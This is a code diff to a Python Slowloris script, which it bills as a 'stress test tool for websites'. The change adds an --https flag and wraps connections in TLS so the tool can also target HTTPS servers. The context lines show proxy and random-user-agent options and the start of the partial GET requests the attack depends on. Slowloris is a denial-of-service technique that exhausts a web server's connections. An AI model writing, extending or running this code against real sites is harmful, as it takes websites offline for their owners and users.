@@ -1,5 +1,5 @@
 #!/usr/bin/python
-import socket, random, time, sys, argparse, random, logging
+import socket, random, time, sys, argparse, random, logging, ssl
 
 parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
 parser.add_argument('host',  nargs="?", help="Host to preform stress test on")
@@ -10,6 +10,7 @@ parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="sto
 parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
 parser.add_argument('--proxy-host', default="127.0.0.1", help="SOCKS5 proxy host")
 parser.add_argument('--proxy-port', default="8080", help="SOCKS5 proxy port", type=int)
+parser.add_argument("--https", dest="https", action="store_true", help="Whether to use https requests")
 parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
 parser.set_defaults(useproxy=False)
@@ -68,6 +69,8 @@ user_agents = [
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
+    if args.https:
+        s = ssl.wrap_socket(s)
     s.connect((ip,args.port))
 
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
